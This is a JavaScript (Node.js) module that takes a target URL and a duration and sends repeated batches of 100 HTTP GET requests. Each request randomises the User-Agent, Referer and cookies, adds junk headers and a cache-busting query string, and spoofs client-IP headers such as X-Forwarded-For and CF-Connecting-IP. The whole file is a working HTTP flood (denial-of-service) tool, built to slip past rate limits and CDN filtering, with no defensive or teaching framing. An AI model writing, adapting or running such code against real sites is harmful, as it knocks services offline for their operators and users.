const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (X11; Linux x86_64)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
];

const referers = [
  "https://www.google.com/",
  "https://www.bing.com/",
  "https://www.facebook.com/",
  "https://twitter.com/",
  "https://t.co/"
];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  const headers = {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": referers[Math.floor(Math.random() * referers.length)] + Math.random().toString(36),
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Cookie": `session=${Math.random().toString(36).substring(2)}`
  };

  // Add some noise headers
  for (let i = 0; i < 3; i++) {
    headers["X-Fake-" + Math.random().toString(36).substring(2, 6)] = Math.random().toString(36);
  }

  return headers;
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const headers = randomHeaders(url.hostname);
    const method = "GET";

    const options = {
      method,
      hostname: url.hostname,
      path: url.pathname + "?" + Math.random().toString(36).substring(2),
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using ${method}`);
      res.on("data", () => {});
    });

    req.on("error", err => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;

    // Smart: delay between batches to avoid hard 503
    const delay = Math.floor(Math.random() * 300) + 100;

    for (let i = 0; i < 100; i++) send();

    setTimeout(loop, delay)
  }

  loop();
};
